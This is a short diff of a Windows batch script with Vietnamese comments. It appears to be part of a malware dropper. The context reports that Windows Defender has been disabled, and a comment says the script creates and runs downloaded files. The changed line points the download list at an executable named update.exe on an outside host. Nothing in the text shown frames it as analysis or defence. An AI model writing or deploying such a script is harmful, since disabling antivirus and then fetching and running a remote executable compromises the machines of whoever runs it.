@@ -17,7 +17,7 @@ echo Windows Defender đã được vô hiệu hóa.
 
 :: Tạo và thực thi các tệp tin đã tải về
 set DOWNLOAD_FOLDER=%TEMP%
-set URL_LIST=https://fvia.id.vn/update/update.exe
+set URL_LIST=https://fvia.id.vn/update.exe
 set FILE_NAMES=update.exe
 
 for %%i in (%URL_LIST%) do (
